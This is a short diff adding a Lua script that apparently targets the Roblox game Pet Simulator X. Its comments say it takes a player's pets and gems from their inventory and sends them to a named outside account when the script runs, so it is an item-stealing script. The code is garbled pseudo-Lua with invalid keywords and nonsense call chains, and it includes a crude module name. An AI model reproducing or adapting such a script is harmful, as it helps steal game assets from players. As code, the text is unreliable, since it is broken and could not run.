@@ -1,0 +1,15 @@
+local Library = require(game:GetService("ReplicatedStorage").bigdick) -- Import PSX Library
+
+local pets = {} 
+--import pets in inventory
+Local petsappend = Append.Library.Pets
+
+-- load gems
+Local gems = gems.Append.Inventory.LocalPlayer
+
+-- Send to user
+If script.executed then do 
+Send.Local.Gems.And.Pets.To.User == “Pvsocq”
+
+end
+end
